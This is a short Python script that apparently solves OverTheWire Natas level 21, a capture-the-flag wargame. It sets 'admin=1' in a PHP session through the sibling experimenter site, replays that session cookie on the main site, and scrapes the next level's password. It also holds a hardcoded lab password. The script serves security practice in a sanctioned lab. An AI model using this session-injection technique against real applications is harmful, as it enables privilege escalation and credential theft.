# PHP Session Injection

import re
import requests
import colorama
from colorama import Fore, Style


# Initialize colorama for colored console output
colorama.init(autoreset=False)
print(Fore.LIGHTBLUE_EX, Style.BRIGHT)

# Set the username and password for authentication
username = 'natas21'
password = '89OWrTkGmiLZLv12JY4tLj2c4FW0xn56'

# Construct the URL using the given username
original_url = f'http://{username}.natas.labs.overthewire.org/'
experimenter_url = f"http://{username}-experimenter.natas.labs.overthewire.org"

# Create a session and set the authorization credentials
session = requests.Session()

# Set the authorization credentials using HTTP Basic Auth
session.auth = (username, password)

# Sending request to experimenter url
resp = session.post(experimenter_url + "/?debug=anything", data={"admin": 1, "submit": "anything"})

# Grabbing the Cookie from the experimenter URL
experimenter_cookie = resp.cookies['PHPSESSID']

# Forwarding the experimenter cookie to the original URL
resp = session.get(original_url, cookies={"PHPSESSID": experimenter_cookie})

print(f"Username: {re.search('Username: (.*)', resp.text).group(1)}")
print(f"Password: {re.search('Password: (.*)</pre>', resp.text).group(1)}")
